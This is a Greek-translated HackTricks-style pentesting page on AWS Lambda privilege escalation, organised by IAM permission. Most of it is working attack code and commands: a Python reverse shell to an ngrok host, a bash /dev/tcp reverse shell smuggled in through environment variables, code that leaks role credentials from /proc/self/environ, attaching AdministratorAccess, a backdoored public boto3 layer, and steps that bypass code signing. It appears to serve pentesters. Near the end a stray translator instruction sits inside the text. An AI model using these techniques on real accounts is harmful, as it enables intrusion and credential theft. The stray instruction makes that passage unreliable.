# AWS - Lambda Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## lambda

Περισσότερες πληροφορίες για τη lambda σε:

{{#ref}}
../../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Οι χρήστες με τα **`iam:PassRole`, `lambda:CreateFunction`, and `lambda:InvokeFunction`** δικαιώματα μπορούν να κλιμακώσουν τα προνόμιά τους.\
Μπορούν να **δημιουργήσουν μια νέα Lambda function και να της αναθέσουν ένα υπάρχον IAM role**, παρέχοντας στη function τα δικαιώματα που σχετίζονται με εκείνο το role. Ο χρήστης μπορεί στη συνέχεια να **γράψει και να ανεβάσει κώδικα σε αυτή τη Lambda function (π.χ. με ένα rev shell)**.\
Μόλις η function ρυθμιστεί, ο χρήστης μπορεί να **εκκινήσει την εκτέλεσή της** και τις επιδιωκόμενες ενέργειες καλώντας τη Lambda function μέσω του AWS API. Αυτή η προσέγγιση επιτρέπει ουσιαστικά στον χρήστη να εκτελεί εργασίες έμμεσα μέσω της Lambda function, λειτουργώντας με το επίπεδο πρόσβασης που παρέχεται από το συσχετισμένο IAM role.\\

Ένας επιτιθέμενος θα μπορούσε να εκμεταλλευτεί αυτό για να αποκτήσει ένα **rev shell και να κλέψει το token**:
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Μπορείτε επίσης να **abuse the lambda role permissions** από την ίδια τη lambda function.\
Εάν το lambda role είχε επαρκή permissions, θα μπορούσατε να το χρησιμοποιήσετε για να αποκτήσετε admin rights:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Είναι επίσης δυνατό να leak τα lambda's role credentials χωρίς να χρειάζεται εξωτερική σύνδεση. Αυτό θα ήταν χρήσιμο για **Network isolated Lambdas** που χρησιμοποιούνται σε εσωτερικές εργασίες. Αν υπάρχουν άγνωστες security groups που φιλτράρουν τα reverse shells σου, αυτό το κομμάτι κώδικα θα σου επιτρέψει να leak απευθείας τα credentials ως output του lambda.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Πιθανός Αντίκτυπος:** Άμεσο privesc στον καθορισμένο αυθαίρετο lambda service role.

> [!CAUTION]
> Σημειώστε ότι, ακόμα κι αν μπορεί να φαίνεται ενδιαφέρον **`lambda:InvokeAsync`** **δεν** επιτρέπει από μόνο του να **εκτελέσετε `aws lambda invoke-async`**, χρειάζεστε επίσης `lambda:InvokeFunction`

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Όπως στο προηγούμενο σενάριο, μπορείτε να **εκχωρήσετε στον εαυτό σας την άδεια `lambda:InvokeFunction`** αν έχετε την άδεια **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potential Impact:** Άμεσο privesc στον αυθαίρετο ρόλο υπηρεσίας lambda που καθορίζεται.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Χρήστες με **`iam:PassRole`, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping`** δικαιώματα (και ενδεχομένως `dynamodb:PutItem` και `dynamodb:CreateTable`) μπορούν έμμεσα να **escalate privileges** ακόμη και χωρίς `lambda:InvokeFunction`.\  
Μπορούν να δημιουργήσουν μια **Lambda function με κακόβουλο κώδικα και να της αναθέσουν έναν υπάρχοντα IAM role**.

Αντί να καλεί απευθείας το Lambda, ο χρήστης δημιουργεί ή χρησιμοποιεί έναν υπάρχοντα πίνακα DynamoDB, συνδέοντάς τον με το Lambda μέσω ενός event source mapping. Αυτή η ρύθμιση διασφαλίζει ότι η Lambda function θα ενεργοποιείται αυτόματα όταν προστεθεί νέο item στον πίνακα, είτε από ενέργεια του χρήστη είτε από άλλη διεργασία, καλώντας έτσι έμμεσα το Lambda και εκτελώντας τον κώδικα με τα δικαιώματα του IAM role που του ανατέθηκε.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Αν το DynamoDB είναι ήδη ενεργό στο περιβάλλον AWS, ο χρήστης απλώς **needs to establish the event source mapping** για τη συνάρτηση Lambda. Ωστόσο, αν το DynamoDB δεν χρησιμοποιείται, ο χρήστης πρέπει να **create a new table** με ενεργοποιημένο το streaming:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Τώρα είναι δυνατό να **συνδέσετε τη Lambda function με το DynamoDB table** δημιουργώντας ένα **event source mapping**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Με τη λειτουργία Lambda συνδεδεμένη με το DynamoDB stream, ο attacker μπορεί **να ενεργοποιήσει έμμεσα το Lambda ενεργοποιώντας το DynamoDB stream**. Αυτό μπορεί να επιτευχθεί με **την εισαγωγή ενός item** στον πίνακα DynamoDB:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Πιθανός Αντίκτυπος:** Άμεση privesc στον καθορισμένο lambda service role.

### `lambda:AddPermission`

Ένας attacker με αυτήν την άδεια μπορεί να **χορηγήσει στον εαυτό του (ή σε άλλους) οποιεσδήποτε άδειες** (αυτό δημιουργεί resource-based policies για να χορηγήσει πρόσβαση στον πόρο):
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**Potential Impact:** Άμεση privesc στον ρόλο υπηρεσίας lambda, μέσω χορήγησης άδειας για τροποποίηση του κώδικα και εκτέλεσή του.

### `lambda:AddLayerVersionPermission`

Ένας επιτιθέμενος με αυτήν την άδεια μπορεί να **παραχωρήσει στον εαυτό του (ή σε άλλους) την άδεια `lambda:GetLayerVersion`**. Μπορεί να αποκτήσει πρόσβαση στο layer και να αναζητήσει ευπάθειες ή ευαίσθητες πληροφορίες
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Πιθανός Αντίκτυπος:** Πιθανή πρόσβαση σε ευαίσθητες πληροφορίες.

### `lambda:UpdateFunctionCode`

Οι χρήστες που διαθέτουν την άδεια **`lambda:UpdateFunctionCode`** έχουν τη δυνατότητα να **τροποποιήσουν τον κώδικα μιας υπάρχουσας Lambda function που είναι συνδεδεμένη με έναν IAM role.**\  
Ο επιτιθέμενος μπορεί να **modify the code of the lambda to exfiltrate the IAM credentials**.

Αν και ο επιτιθέμενος ενδέχεται να μην έχει την άμεση δυνατότητα να καλέσει τη λειτουργία, εάν η Lambda function είναι προϋπάρχουσα και λειτουργική, είναι πιθανό ότι θα ενεργοποιηθεί μέσω υπαρχόντων workflows ή events, διευκολύνοντας έτσι έμμεσα την εκτέλεση του τροποποιημένου κώδικα.
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**Πιθανός Αντίκτυπος:** Άμεση privesc στο ρόλο υπηρεσίας του Lambda που χρησιμοποιείται.

### `lambda:UpdateFunctionConfiguration`

#### RCE μέσω env variables

Με αυτά τα permissions είναι δυνατό να προστεθούν μεταβλητές περιβάλλοντος που θα κάνουν το Lambda να εκτελέσει αυθαίρετο κώδικα. Για παράδειγμα σε python είναι δυνατό να καταχραστεί κανείς τις μεταβλητές περιβάλλοντος `PYTHONWARNING` και `BROWSER` ώστε μια διεργασία python να εκτελέσει αυθαίρετες εντολές:
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
Για άλλες scripting languages υπάρχουν άλλα env variables που μπορείτε να χρησιμοποιήσετε. Για περισσότερες πληροφορίες δείτε τις υποενότητες των scripting languages στο:

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE via Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) επιτρέπει την συμπερίληψη **code** στη lamdba function αλλά **αποθηκεύοντάς το ξεχωριστά**, έτσι ο function code μπορεί να παραμείνει μικρός και **several functions can share code**.

Μέσα στο lambda μπορείτε να ελέγξετε τις διαδρομές από όπου φορτώνεται το python code με μια function όπως η ακόλουθη:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Αυτές είναι οι τοποθεσίες:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Για παράδειγμα, η βιβλιοθήκη boto3 φορτώνεται από `/var/runtime/boto3` (4η θέση).

#### Εκμετάλλευση

Είναι δυνατόν να καταχραστείτε την άδεια `lambda:UpdateFunctionConfiguration` για να **προσθέσετε ένα νέο layer** σε μια lambda function. Για να εκτελεστεί αυθαίρετος κώδικας, αυτό το layer πρέπει να περιέχει κάποια **βιβλιοθήκη που πρόκειται να εισάγει η lambda.** Αν μπορείτε να διαβάσετε τον κώδικα της lambda, μπορείτε να το βρείτε εύκολα. Επίσης, σημειώστε ότι μπορεί να είναι πιθανό ότι η lambda **χρησιμοποιεί ήδη ένα layer** και να μπορείτε να **κατεβάσετε** το layer και να **προσθέσετε τον κώδικά σας** εκεί μέσα.

Για παράδειγμα, ας υποθέσουμε ότι η lambda χρησιμοποιεί τη βιβλιοθήκη boto3 — αυτό θα δημιουργήσει ένα τοπικό layer με την τελευταία έκδοση της βιβλιοθήκης:
```bash
pip3 install -t ./lambda_layer boto3
```
Μπορείτε να ανοίξετε `./lambda_layer/boto3/__init__.py` και **add the backdoor in the global code** (μια συνάρτηση για να exfiltrate credentials ή να αποκτήσετε ένα reverse shell, για παράδειγμα).

Στη συνέχεια, zip-άρετε τον φάκελο `./lambda_layer` και **upload the new lambda layer** στον δικό σας λογαριασμό (ή στον account του victim, αλλά ίσως να μην έχετε δικαιώματα για αυτό).\
Σημειώστε ότι χρειάζεται να δημιουργήσετε έναν φάκελο python και να βάλετε εκεί τις βιβλιοθήκες ώστε να υπερκαλύψετε το /opt/python/boto3. Επίσης, το layer πρέπει να είναι **compatible with the python version** που χρησιμοποιείται από το lambda και, αν το ανεβάσετε στον λογαριασμό σας, πρέπει να βρίσκεται στην **same region:**
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
Τώρα, κάντε το ανεβασμένο lambda layer **προσβάσιμο από οποιονδήποτε λογαριασμό**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Και επισυνάψτε το lambda layer στη victim lambda function:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Το επόμενο βήμα είναι είτε να **invoke the function** οι ίδιοι αν μπορούμε είτε να περιμένουμε μέχρι i**t gets invoked** με κανονικά μέσα — που είναι η ασφαλέστερη μέθοδος.

Μια **more stealth way to exploit this vulnerability** μπορεί να βρεθεί στο:

{{#ref}}
../../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**Πιθανός Αντίκτυπος:** Direct privesc to the lambda service role used.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Ίσως με αυτά τα permissions να μπορείτε να create a function και να execute it καλώντας το URL... αλλά δεν μπόρεσα να βρω τρόπο να το δοκιμάσω, οπότε ενημερώστε με αν το κάνετε!

### Lambda MitM

Κάποιες lambdas πρόκειται να είναι **receiving sensitive info from the users in parameters.** Αν αποκτήσετε RCE σε μία από αυτές, μπορείτε να exfiltrate τις πληροφορίες που άλλοι users στέλνουν σε αυτήν, δείτε το στο:

{{#ref}}
../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## Αναφορές

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Bypass Lambda Code Signing

Αν μια Lambda function επιβάλει code signing, ένας attacker που μπορεί είτε να αφαιρέσει το Code Signing Config (CSC) είτε να το υποβαθμίσει σε Warn μπορεί να deploy unsigned code στη function. Αυτό παρακάμπτει τα integrity protections χωρίς να τροποποιήσει το function's IAM role ή τα triggers.

Permissions (one of):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Σημειώσεις:
- Για το Path B, δεν χρειάζεστε AWS Signer profile αν η πολιτική CSC οριστεί σε `WARN` (unsigned artifacts allowed).

Steps (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

Prepare a small payload:
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
Μονοπάτι A) Αφαίρεση CSC και μετά ενημέρωση κώδικα:
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Διαδρομή B) Υποβάθμιση σε Warn και ενημέρωση κώδικα (αν το delete δεν επιτρέπεται):
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Επιβεβαιώνω: θα μεταφράσω το σχετικό αγγλικό κείμενο στα Ελληνικά διατηρώντας ακριβώς το ίδιο markdown/HTML. Δεν θα μεταφράσω code, ονόματα τεχνικών hacking, κοινές λέξεις hacking, ονόματα cloud/SaaS (π.χ. Workspace, aws, gcp), τη λέξη 'leak', pentesting, συνδέσμους ή paths (π.χ. lamda-post-exploitation.md), ούτε tags/refs όπως {#tabs}, {#tab name="Method1"}, {#ref}generic-methodologies-and-resources/pentesting-methodology.md{#endref} κ.λπ. Δεν θα προσθέσω επιπλέον περιεχόμενο πέρα από τη μετάφραση.
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
Πιθανός αντίκτυπος: Δυνατότητα να ανεβάσει και να εκτελέσει αυθαίρετο μη υπογεγραμμένο κώδικα σε συνάρτηση που υποτίθεται ότι επέβαλε υπογεγραμμένες αναπτύξεις, ενδεχομένως οδηγώντας σε εκτέλεση κώδικα με τα δικαιώματα του ρόλου της συνάρτησης.

Καθαρισμός:
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

